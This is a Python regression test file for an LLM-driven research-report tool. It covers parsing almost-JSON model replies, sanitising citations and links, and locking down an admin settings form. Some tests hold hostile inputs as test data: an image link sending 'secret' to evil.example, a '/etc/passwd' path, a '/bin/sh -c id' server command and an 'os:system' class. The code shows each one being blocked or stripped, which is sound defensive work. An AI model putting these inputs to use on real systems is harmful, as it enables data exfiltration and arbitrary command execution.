"""Regressions for defects found in the 2026-09-19 review and its real acceptance run.

Weak and slow models, model gateways and search-only internal tools are the
deployment these cover: replies that are almost JSON, answers cut off at the
output cap, markers that are almost markers, and settings an administrator can
save through a web form.
"""

import types

import pytest
from pydantic import BaseModel

from deepresearch import report as documents
from deepresearch.config import Settings
from deepresearch.evidence import canonical_url
from deepresearch.output import parse_contract, visible_text
from deepresearch.report_policy import eligible_evidence
from deepresearch.sources import observed_sources


def configured(settings, **changes):
    return Settings.model_validate({**settings.model_dump(mode="json"), **changes})


class Request(BaseModel):
    user_query: str
    acknowledgement: str = ""


# --- replies of weak models ----------------------------------------------------


def test_reasoning_with_only_a_closing_tag_is_not_the_answer():
    # A chat template that pre-fills "<think>" leaves only "</think>" in the reply.
    reply = '先想一下…{"user_query": "草稿"}…</think>{"user_query": "最终请求"}'
    assert visible_text(reply) == '{"user_query": "最终请求"}'
    assert parse_contract(reply, Request).user_query == "最终请求"
    assert visible_text("<think>hidden</think>shown") == "shown"


def test_the_real_object_wins_over_an_example_and_almost_json_is_read():
    shown = '示例：{"user_query": "示例"}\n答案：{"user_query": "这是一个更长的真实研究请求", "acknowledgement": "好"}'
    assert parse_contract(shown, Request).user_query == "这是一个更长的真实研究请求"
    assert parse_contract('{"result": {"user_query": "嵌套"}}', Request).user_query == "嵌套"
    # Trailing commas and single quotes: still validated in full.
    assert parse_contract("{'user_query': '单引号', 'acknowledgement': '尾逗号',}", Request).acknowledgement == "尾逗号"


def test_a_failed_reply_tells_the_model_what_was_wrong():
    with pytest.raises(ValueError, match="cut off before its closing brace"):
        parse_contract('{"user_query": "被截断', Request)
    with pytest.raises(ValueError, match="no JSON object found"):
        parse_contract("我无法完成这个请求。", Request)
    with pytest.raises(ValueError, match="user_query"):
        parse_contract('{"acknowledgement": "缺字段"}', Request)


# --- report text -----------------------------------------------------------------

ELIGIBLE = {"E001", "E002"}


def test_near_miss_markers_are_normalized_and_the_rest_cannot_pass():
    text = documents.normalize_markers("甲 [[e001]]。乙 [[E001 E002]]。丙 【E001、E002】。丁（E001）。戊 [[E001-E002]]。")
    assert documents.marker_ids(text) == ["E001", "E001", "E002", "E001", "E002", "E001", "E001", "E002"]
    assert documents.problems(text, ELIGIBLE) == []
    # No three-digit ID to normalize: reported, and the sentence cannot stay.
    broken = documents.normalize_markers("事实 [[E12]]。分析成立 [[E001]]。")
    assert any("malformed evidence marker" in error for error in documents.problems(broken, ELIGIBLE))
    assert documents.sanitize(broken, ELIGIBLE)[0] == "分析成立 [[E001]]。"
    # A model name in parentheses is not a citation.
    assert documents.normalize_markers("采用 Xeon (E2650) 处理器 [[E001]]。") == "采用 Xeon (E2650) 处理器 [[E001]]。"


def test_removing_a_statement_keeps_no_uncited_half_and_no_broken_bold():
    # The clause before the semicolon shared the citation that could not be verified.
    assert documents.sanitize("甲厂份额为 45%；乙厂份额为 30% [[E999]]。C 成立 [[E001]]。", ELIGIBLE)[0] == "C 成立 [[E001]]。"
    assert documents.sanitize("**判断句 [[E999]]。** 后续分析成立 [[E001]]。", ELIGIBLE)[0] == "后续分析成立 [[E001]]。"
    kept = documents.sanitize("According to e.g. Gartner the share is 40% [[E001]]. Next claim [[E999]].", ELIGIBLE)[0]
    assert kept == "According to e.g. Gartner the share is 40% [[E001]]."


def test_only_in_document_links_survive_and_matching_stays_linear():
    import time

    text, audit = documents.sanitize("见 ![p](//evil.example/t.png?d=secret) 与 [x](//host) 和 [y](#sec) 以及 mailto:a@b.c", ELIGIBLE)
    assert text == "见 p 与 x 和 [y](#sec) 以及 " and audit["stripped_links"] == 3
    assert documents.sanitize("正文 [[E001]]\n[文档]: //evil.example/x", ELIGIBLE)[0] == "正文 [[E001]]"
    assert any("URL or link" in error for error in documents.problems("![p](//evil.example/t.png)", ELIGIBLE))
    started = time.monotonic()
    documents.problems("[" * 40000, ELIGIBLE)
    assert time.monotonic() - started < 2


def test_an_answer_cut_off_inside_a_code_block_cannot_swallow_the_report():
    cut = "第一段 [[E001]]\n\n```mermaid\ngraph TD\nA-->B"
    assert documents.close_fences(cut) == ("第一段 [[E001]]", True)
    assert documents.clean_answer(cut) == "第一段 [[E001]]"
    assert documents.clean_answer("正文 [[E001]]\n\n```python\nprint(1)").endswith("print(1)\n```")
    report = documents.assemble("报告", "摘要 [[E001]]", [("一", documents.clean_answer(cut)), ("二", "第二节 [[E002]]")], [], ["局限"], "zh")
    assert [item["text"] for item in documents.toc(report)] == ["执行摘要", "一", "二", "研究范围与局限"]
    assert documents.marker_ids(report) == ["E001", "E001", "E002"]
    assert documents.close_fences("```python\nprint(1)\n```\n结尾") == ("```python\nprint(1)\n```\n结尾", False)


def test_labels_written_by_the_outline_model_are_cleaned_before_assembly():
    assert documents.plain_text("未能打开 https://intranet.example/x.pdf ，样本有限[1]，假设 [[E404]] 成立") == "未能打开，样本有限，假设 成立"
    report = documents.assemble("报告", "结论 [[E001]]", [("一", "正文 [[E001]]")], [documents.plain_text("假设 [[E404]]")], [documents.plain_text("未能打开 https://x.example/a")], "zh")
    assert documents.problems(report, ELIGIBLE) == []
    assert documents.clean_answer("正文\x0b含控制字符 [[E001]]") == "正文含控制字符 [[E001]]"


def test_a_cited_paragraph_about_evidence_numbering_is_content_not_bookkeeping():
    kept = "取证流程要求为每件物证登记证据编号 [[E001]]。"
    assert documents.clean_answer(kept + "\n\n以上内容未新增证据 ID。") == kept
    # The fetch header is a block at the top; the same words inside a page are its text.
    assert documents.excerpt("Source: https://a.example\nTitle: T\n\n正文\nSource: 这一行是页面内容") == "正文\nSource: 这一行是页面内容"


def test_the_report_always_tells_the_reader_what_went_wrong():
    from deepresearch.runner import reader_caveats

    raw = ["研究步骤“市场规模”未能完成（NATIVE_AGENT_TIMEOUT），相关内容可能不完整。", "部分数据来自厂商披露 https://vendor.example/pr", "样本量较小"]
    # A weak outline model returned no limitation at all.
    assert reader_caveats([], raw, lang="zh") == ["研究步骤“市场规模”未能完成（NATIVE_AGENT_TIMEOUT），相关内容可能不完整。", "部分数据来自厂商披露", "样本量较小"]
    merged = reader_caveats(["数据截至 2026 年 6 月"], raw, ["风险"], "zh")
    assert merged[0] == "数据截至 2026 年 6 月" and "章节“风险”未能生成，相关内容见其他章节或研究记录。" in merged
    assert any("未能完成" in text for text in merged)  # the failed step is never dropped


# --- references ------------------------------------------------------------------


def test_references_say_when_only_an_excerpt_was_read():
    def item(eid, **changes):
        base = {
            "evidence_id": eid,
            "url": None,
            "canonical_url": None,
            "source_uri": f"tool-result://x/{eid}",
            "source_name": "internal-wiki",
            "origin": "internal",
            "title": "差旅标准",
            "publisher": "wiki",
            "published_at": None,
            "snippet": "摘录",
            "provenance": "tool_output",
            "document_hash": eid,
        }
        return {**base, **changes}

    pool = {
        "E001": item("E001"),
        "E002": item("E002", source_name="internal-docs", title="压测报告"),
        "E003": item("E003", url="https://a.example/p", canonical_url="https://a.example/p", provenance="fetched_document", source_name="web", title="原文"),
    }
    roles = {"internal-wiki": "search", "internal-docs": "data", "web": "read"}
    document = documents.assemble("报告", "甲 [[E001]] 乙 [[E002]] 丙 [[E003]]", [], lang="zh")
    mapping = documents.bind(document, pool)
    assert [value["basis"] for value in documents.citations(mapping, pool, roles)] == ["search excerpt", "record", "page"]
    exported = documents.export_markdown(document, mapping, pool, "zh", False, roles)
    assert "1. 差旅标准 — internal-wiki（检索摘录，未读取原文）" in exported and "2. 压测报告 — internal-docs\n" in exported
    assert "tool-result://" not in exported and "检索摘录" in documents.html_document(document, mapping, pool, "zh", False, roles)
    assert documents.evidence_basis(pool["E003"], roles) == "page"


def test_single_page_application_routes_are_different_pages():
    assert canonical_url("https://wiki.corp.example/#/doc/1") != canonical_url("https://wiki.corp.example/#/doc/2")
    assert canonical_url("https://a.example/guide#install") == canonical_url("https://a.example/guide")
    found = observed_sources("\n".join(f"- [文档{n}](https://wiki.corp.example/#/doc/{n})" for n in range(1, 6)), connector="wiki", origin="internal")
    assert len(found) == 5


def test_a_link_excerpt_stops_at_its_neighbours():
    text = '[{"title": "A 白皮书", "url": "https://wiki.corp.example/a", "snippet": "A 产品营收 10 亿元。"}, {"title": "B 周报", "url": "https://wiki.corp.example/b", "snippet": "B 产品营收 99 亿元。"}]'
    first, second = observed_sources(text, connector="kb", origin="internal")
    assert "10 亿元" in first["excerpt"] and "99 亿元" not in first["excerpt"]
    assert "99 亿元" in second["excerpt"] and "10 亿元" not in second["excerpt"]


# --- one decision about what can be cited -------------------------------------------


def test_what_a_step_was_allowed_to_cite_stays_citable_for_the_report(settings):
    """A role limited to an internal search tool, in a deployment that also has a web reader.

    The step had no tool to open originals, so its results were its evidence;
    gap review and the writer used to decide again from deployment-wide settings
    and drop all of it.
    """
    record = {"evidence_id": "E001", "url": None, "canonical_url": None, "source_uri": "tool-result://x/rec_1", "source_name": "external-web", "origin": "external", "provenance": "tool_output", "title": "结果", "snippet": "摘录"}
    assert eligible_evidence({"E001": record}, {}, settings) == set()
    assert eligible_evidence({"E001": {**record, "citable": True}}, {}, settings) == {"E001"}
    # "Originals only" cannot be met by a step that could not open any; it says so instead of failing.
    assert eligible_evidence({"E001": {**record, "citable": True}}, {"require_original": True}, settings) == {"E001"}
    assert eligible_evidence({"E001": record}, {"require_original": True}, settings) == set()


def test_supplements_are_matched_by_the_step_they_extend_and_questions_earn_one_round():
    from deepresearch.contracts import ResearchPlan, ResearchUnit
    from deepresearch.validators import research_gaps, supplemental_units

    plan = ResearchPlan(goal="the goal", research_units=[ResearchUnit(id="market", skill="industry-trend", objective="market objective"), ResearchUnit(id="market-size", skill="industry-trend", objective="size objective")])
    pool = {"E001": {"origin": "internal", "provenance": "document", "published_at": None}, "E002": {"origin": "external", "provenance": "document", "published_at": None}}
    supplement = {"id": "S1-x", "parent_gap_id": "market-size-coverage", "depends_on": ["market-size"]}
    findings = [{"unit_id": "S1-x", "evidence_ids": ["E001", "E002"]}]
    gaps = research_gaps(plan, [unit.model_dump() for unit in plan.research_units] + [supplement], findings, pool, [])
    # "market" has no finding of its own: a supplement of "market-size" must not close its gap.
    assert ("market", "coverage") in {(gap["unit_id"], gap["code"]) for gap in gaps}
    assert ("market-size", "coverage") not in {(gap["unit_id"], gap["code"]) for gap in gaps}

    single = ResearchPlan(goal="the goal", research_units=[ResearchUnit(id="R1", skill="industry-trend", objective="the objective")])
    base = [{"unit_id": "R1", "evidence_ids": ["E001", "E002"]}]
    first = research_gaps(single, [single.research_units[0].model_dump()], base, pool, [{"unit_id": "R1", "open_questions": ["还能查什么"]}])
    assert [gap["code"] for gap in first] == ["open-questions"]
    again = research_gaps(
        single,
        [single.research_units[0].model_dump(), {"id": "S1-r", "parent_gap_id": "R1-open-questions", "depends_on": ["R1"]}],
        base,
        pool,
        [{"unit_id": "R1", "open_questions": ["还能查什么"]}, {"unit_id": "S1-r", "open_questions": ["又想到一个"]}],
    )
    assert again == []
    # A long list of questions cannot make the supplement's objective invalid.
    long_gap = [{"unit_id": "R1", "gap_id": "R1-open-questions", "code": "open-questions", "description": "问" * 5000}]
    assert len(supplemental_units(single, long_gap, 1, 3)[0]["objective"]) <= 4000


# --- evidence text and tool accounting ------------------------------------------------


def test_a_long_page_stays_text_when_it_is_archived_as_evidence():
    from deepresearch.trace import redact, redact_content

    page = "段落内容 with Bearer sk-abcdef123456 and\nnewlines " * 900
    assert isinstance(redact(page, (), 20000), dict)  # fine for a trace payload
    archived = redact_content(page, (), 20000)
    assert isinstance(archived, str) and len(archived) == 20000 and "sk-abcdef123456" not in archived
    blocks = redact_content([{"type": "text", "text": page}], (), 20000)
    assert isinstance(blocks[0]["text"], str)


@pytest.mark.asyncio
async def test_an_mcp_call_inside_a_source_tool_is_not_a_second_tool_call():
    """A real run billed 25 searches as 41: the inner MCP call reached the research callbacks."""
    from deepresearch.mcp import McpManager

    seen = {}

    class Tool:
        name = "search_docs"

        async def ainvoke(self, call, config=None):
            seen.update(config=config, call=call)
            return types.SimpleNamespace(content="ok", artifact=None, status="success")

    assert await McpManager().call(Tool(), {"query": "q"}) == ("ok", None, "success")
    assert seen["config"] == {"callbacks": []} and seen["call"]["args"] == {"query": "q"}


def test_gateways_get_the_parameter_names_they_understand(monkeypatch, settings):
    from deepresearch.chat_completions import ChatCompletionsModel
    from deepresearch.models import CHAT_COMPLETIONS, engine_model

    monkeypatch.setenv("GATEWAY_KEY", "k-123456789")
    base = {"provider": "openai", "model": "m", "api_key": "$GATEWAY_KEY"}
    models = [
        {**base, "name": "gateway", "base_url": "http://gateway.internal/v1"},
        {**base, "name": "official", "base_url": "https://api.openai.com/v1"},
        {**base, "name": "new-gateway", "base_url": "http://gateway.internal/v1", "max_tokens_param": "max_completion_tokens"},
        {**base, "name": "default"},
    ]
    uses = {spec.name: engine_model(spec).use for spec in configured(settings, models=models, default_model="gateway").models}
    assert uses == {"gateway": CHAT_COMPLETIONS, "official": "langchain_openai:ChatOpenAI", "new-gateway": "langchain_openai:ChatOpenAI", "default": "langchain_openai:ChatOpenAI"}
    # LangChain always renames max_tokens; a gateway on the earlier protocol
    # then ignored the cap (7,400 tokens written against 4,096) or rejects the call.
    payload = ChatCompletionsModel(model="m", base_url="http://gateway.internal/v1", api_key="x", max_tokens=1234)._get_request_payload([("user", "hi")])
    assert payload["max_tokens"] == 1234 and "max_completion_tokens" not in payload


# --- what the settings page may save --------------------------------------------------


def test_the_settings_page_cannot_read_files_start_processes_or_keep_pasted_credentials(settings):
    from deepresearch import profile

    skills = settings.model_dump(mode="json")["skills"]
    with pytest.raises(ValueError, match="skills.technical-route.path"):
        profile.effective(settings, {"skills": {**skills, "technical-route": {**skills["technical-route"], "methodology": None, "path": "/etc/passwd"}}})
    with pytest.raises(ValueError, match="stdio MCP server"):
        profile.effective(settings, {"mcp_servers": {"local": {"transport": "stdio", "command": "/bin/sh", "args": ["-c", "id"]}}})
    with pytest.raises(ValueError, match="custom model class"):
        profile.effective(settings, {"models": [{"name": "x", "provider": "custom", "use": "os:system", "model": "m"}], "default_model": "x"})
    with pytest.raises(ValueError, match="reference the credential"):
        profile.effective(settings, {"mcp_servers": {"kb": {"transport": "http", "url": "http://mcp.internal/mcp", "headers": {"Authorization": "Bearer sk-live-123456"}}}})
    # References, interpolated or whole, and ordinary headers are fine.
    allowed = profile.effective(settings, {"mcp_servers": {"kb": {"transport": "http", "url": "http://mcp.internal/mcp", "headers": {"Authorization": "Bearer ${KB_TOKEN}", "Cookie": "sid=${secret:kb}", "Accept": "application/json"}}}})
    assert allowed.mcp_servers["kb"].headers["Accept"] == "application/json"
    # The operator's own file may define what the web form may not.
    operator = configured(settings, mcp_servers={"local": {"transport": "stdio", "command": "uvx", "args": ["internal-mcp"]}})
    assert profile.effective(operator, {"mcp_servers": operator.model_dump(mode="json")["mcp_servers"]}).mcp_servers["local"].command == "uvx"


def test_a_user_who_cannot_edit_never_sees_a_literal_credential():
    from deepresearch import profile

    view = {
        "mcp_servers": {"kb": {"headers": {"Authorization": "Bearer sk-live-123456", "X-Token": "$KB_TOKEN", "Accept": "application/json"}, "env": {"API_KEY": "literal"}}},
        "sources": [{"name": "s", "providers": [{"id": "p", "url": "https://api.example/search?token=literal-token&q={query}", "headers": {"X-Api-Key": "literal-key"}}]}],
    }
    masked = profile.masked(view)
    assert masked["mcp_servers"]["kb"]["headers"] == {"Authorization": "[hidden]", "X-Token": "$KB_TOKEN", "Accept": "application/json"}
    assert masked["mcp_servers"]["kb"]["env"] == {"API_KEY": "[hidden]"}
    assert masked["sources"][0]["providers"][0] == {"id": "p", "url": "https://api.example/search?[hidden]", "headers": {"X-Api-Key": "[hidden]"}}
    assert view["mcp_servers"]["kb"]["headers"]["Authorization"] == "Bearer sk-live-123456"  # the input is not changed


def test_the_reader_language_follows_the_sentence_not_one_character():
    from deepresearch.runner import language_name

    assert documents.language("对比 Milvus Qdrant Weaviate pgvector 性能") == "zh"
    assert documents.language("Compare Milvus、Qdrant 的性能") == "zh"
    # One Chinese name inside an English question is still an English question.
    assert documents.language("What is 比亚迪's market share in Europe in 2026?") == "en"
    assert documents.language("比亚迪在欧洲的份额如何？Please answer in English.") == "en"
    assert documents.language("Summarize the EU AI Act，用中文回答") == "zh"
    # Japanese has no label set of its own, but researchers are told the right language.
    assert documents.language("ベクトルデータベースの比較をしてください") == "en"
    assert language_name("ベクトルデータベースの比較をしてください") == "Japanese (日本語)"
    assert language_name("调研一下最新的人工智能的发展") == "Simplified Chinese (简体中文)"


def test_a_citation_excerpt_starts_at_the_text_not_at_the_page_navigation():
    page = (
        "Source: https://docs.example.org/deploy\nTitle: Deploy\nExcerpt: characters 0-8000 of 42000.\n\n"
        '[](https://docs.example.org/ "logo") Develop Deploy Ecosystem Learn Log in\n\n'
        "*   [Documentation](https://docs.example.org/documentation/)\n*   [Guides](https://docs.example.org/guides/)\n\n"
        "# Distributed deployment\n\n"
        "Since version 0.8 the service supports a distributed mode in which several nodes share the data, see [sharding](https://docs.example.org/sharding).\n"
    )
    text = documents.excerpt(page, 400)
    assert text.startswith("# Distributed deployment\n\nSince version 0.8 the service supports")
    assert "](" not in text and "logo" not in text and text.endswith("see sharding.")
    # A short record has no navigation to skip.
    assert documents.excerpt("一线城市住宿每晚不超过 600 元。") == "一线城市住宿每晚不超过 600 元。"
